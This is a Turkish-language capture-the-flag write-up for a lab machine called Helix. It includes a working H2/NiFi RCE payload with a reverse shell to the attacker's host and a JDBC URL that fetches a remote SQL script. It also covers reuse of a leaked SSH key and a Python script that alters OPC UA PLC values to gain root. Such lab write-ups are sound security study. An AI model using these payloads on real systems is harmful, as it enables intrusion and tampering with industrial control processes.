@@ -1,0 +1,122 @@
+1. Keşif (Recon)
+
+Makineye bağlanır bağlanmaz ilk işim her zamanki gibi nmap ile hangi kapıların açık olduğunu kontrol etmek oldu. Nmap sonucu oldukça sade ve nettir; sadece 22 ve 80 numaralı portlar açıktır.
+
+nmap -sC -sV -p- --min-rate 5000 ip
+
+22/tcp open ssh OpenSSH 8.9p1
+80/tcp open http nginx/1.18.0 (Ubuntu)
+
+80. portta bir web sitesi karşıma çıktı: "Helix Industries". Site endüstriyel kontrol sistemleri üzerine çalışan bir firmanın tanıtım sayfasıydı. Ancak burada gizli bir subdomain olabileceğini düşünerek fuzzing işlemine başladım.
+
+2. VHost Fuzzing ile Gizli Subdomain Keşfi
+
+Nginx kullanan bir web sunucusunda, sanal host (Virtual Host) yapısı çok yaygındır. Bu yüzden ffuf ile Host header fuzzing yapmaya karar verdim.
+
+ffuf -u http://ip -H "Host: FUZZ.helix.htb" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
+
+Yapılan tarama sonucunda sadece bir tane farklı alt domain çıktı: flow.helix.htb. Bu domaini /etc/hosts dosyasına ekleyip tarayıcıda açtığımda karşıma Apache NiFi (v1.21.0) arayüzü çıktı. Arayüze hiçbir şifre olmadan (anonim) erişim sağlayabiliyordum. İşte zafiyet buradaydı.
+
+3. Apache NiFi CVE-2023-34468 ile RCE (Reverse Shell Alma)
+
+NiFi arayüzünde Controller Settings menüsüne girdim. Controller Services sekmesinde H2 Veritabanı için bir DBCPConnectionPool servisi olduğunu fark ettim. H2 driver'ı, CVE-2023-34468 olarak bilinen ve dışarıdan SQL sorguları ile kod çalıştırılmasına izin veren çok bilinen bir zafiyete sahipti.
+
+Önce kendi Kali makinemde /tmp klasörüne gidip rce.sql adında bir dosya oluşturdum. İçine şu Java alias'ını ve reverse shell komutunu yazdım:
+
+CREATE ALIAS SHELLEXEC AS $$ String shellexec(String cmd) throws java.io.IOException {
+    String[] command = {"bash", "-c", cmd};
+    java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(command).getInputStream()).useDelimiter("\\A");
+    return s.hasNext() ? s.next() : "";
+} $$;
+CALL SHELLEXEC('bash -i >& /dev/tcp/tun0/4444 0>&1');
+
+Dosyayı kaydettikten sonra, rce.sql dosyasını servis etmesi için 80 portundan bir Python web sunucusu başlattım:
+
+python3 -m http.server 80
+
+Ardından başka bir terminalde reverse shell'i yakalamak için netcat dinleyicisini açtım:
+
+nc -lvnp 4444
+
+NiFi arayüzüne geri döndüm. H2 Connection Pool servisini seçip Configure (Ayarla) butonuna tıkladım. Properties sekmesindeki Database Connection URL kısmını şu şekilde değiştirdim:
+
+jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER TRIGGER_NAME BEFORE SELECT ON INFORMATION_SCHEMA.TABLES AS $$BEGIN RUNSCRIPT FROM 'http://tun0/rce.sql'; END$$
+
+Bu işlemi yapıp Apply dedikten sonra servisi Enable (Aktif) ettim. Sonra boş bir ExecuteSQL processor'ü oluşturdum ve onu da Start (Başlat) dedim. Processor çalıştığı an H2 veritabanı tetikleyiciyi devreye soktu, benim Kali'deki web sunucuma rce.sql dosyası için istek attı ve terminaldeki netcat dinleyicisine reverse shell düştü. Artık makinemin içindeydim!
+
+4. Lateral Movement: nifi'den operator'e Geçiş
+
+Shell nifi kullanıcısı olarak geldi. Hemen makinenin içinde bir keşif turlarına başladım. NiFi'nin kurulu olduğu dizin olan /opt/nifi-1.21.0 altındaki support-bundles klasörüne girdim. Burada bir yedekleme dosyası dikkatimi çekti: operator_id_ed25519.bak.
+
+cat operator_id_ed25519.bak
+
+Dosyanın içinde operator kullanıcısına ait özel bir SSH anahtarı vardı. Bu anahtarı kopyalayıp Kali makinemde operator_key adında bir dosyaya kaydettim. Dosyaya uygun izinleri (600) verdim.
+
+chmod 600 operator_key
+
+Ardından bu anahtarla SSH üzerinden operator kullanıcısı olarak makineye giriş yaptım:
+
+ssh -i operator_key operator@ip
+
+Ve karşımda operator@helix shell'i vardı! Hemen user flag'i aldım.
+
+cat user.txt
+*
+
+5. Yetki Yükseltme (Root) - OPC UA ile Maintenance Modu Açma
+
+operator kullanıcısı olarak sudo -l komutunu çalıştırdığımda, şifresiz olarak /usr/local/sbin/helix-maint-console dosyasını çalıştırabileceğimi gördüm. Ancak bu scripti denediğimde "Maintenance window CLOSED." (Bakım penceresi kapalı) hatası alıyordum.
+
+Bu bakım modunun, makinemin 127.0.0.1:4840 adresinde çalışan OPC UA protokolü (Endüstriyel kontrol protokolü) tarafından kontrol edildiğini öğrendim.
+
+Makineye SSH ile bağlı olduğum terminalde, Kali'den OPC UA servisine erişmek için bir port forwarding (tünel) açtım:
+
+ssh -i operator_key -L 4840:127.0.0.1:4840 operator@10.129.245.123
+
+Bu terminali açık bıraktım. Ardından kendi Kali makinemde, writeup'ta bulduğum OPC UA bağlantı kodunu biraz düzelterek py.py adında bir Python scripti oluşturdum.
+
+Kali'de OPC UA kütüphanesi kurmak için önce sanal bir ortam oluşturdum, ardından kütüphaneyi kurdum:
+
+python3 -m venv venv
+source venv/bin/activate
+pip install opcua
+
+py.py dosyasının içine şu kodu yazdım (Yazarken dikkat ettim: writeup'ta Float değeri vardı ama OPC UA Double tipinde veri beklediği için onu Double olarak değiştirdim):
+
+import time
+from opcua import Client, ua
+
+client = Client("opc.tcp://127.0.0.1:4840")
+client.set_user("operator")
+client.set_password("operator1")
+
+client.connect()
+print("[+] Connected to PLC as operator")
+
+client.get_node("ns=2;i=12").set_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
+client.get_node("ns=2;i=13").set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
+
+val = 0.0
+print("[*] Starting CalibrationOffset ramp...")
+
+while True:
+    temp = client.get_node("ns=2;i=4").get_value()
+    if 295.0 <= temp < 305.0:
+        print("[!!!] MAINTENANCE WINDOW OPEN!")
+        break
+    val += 2.0
+    client.get_node("ns=2;i=6").set_value(ua.DataValue(ua.Variant(val, ua.VariantType.Double)))
+    time.sleep(1)
+
+print("[!] Tamam. Simdi diger terminalde sudo /usr/local/sbin/helix-maint-console yaz!")
+
+Scripti çalıştırdığımda OPC UA sunucusuna bağlandı, sıcaklığı kademeli olarak 295 dereceye çıkardı ve ekrana "MAINTENANCE WINDOW OPEN!" yazdı. Bu mesajı gördüğüm an, operator SSH shell'inin olduğu terminale dönüp şu komutu yazdım:
+
+sudo /usr/local/sbin/helix-maint-console
+
+İşte o an terminalimin prompt'u değişti ve artık root olmuştum!
+
+root@helix:~# cat /root/root.txt
+*
+
+Sonuç olarak; NiFi'deki H2 RCE ile nifi shell aldım, yedekleme klasöründe bulduğum SSH private key ile operator kullanıcısına geçtim, ardından OPC UA tüneli ile bakım modunu açtım ve root oldum. Helix tamamdı!
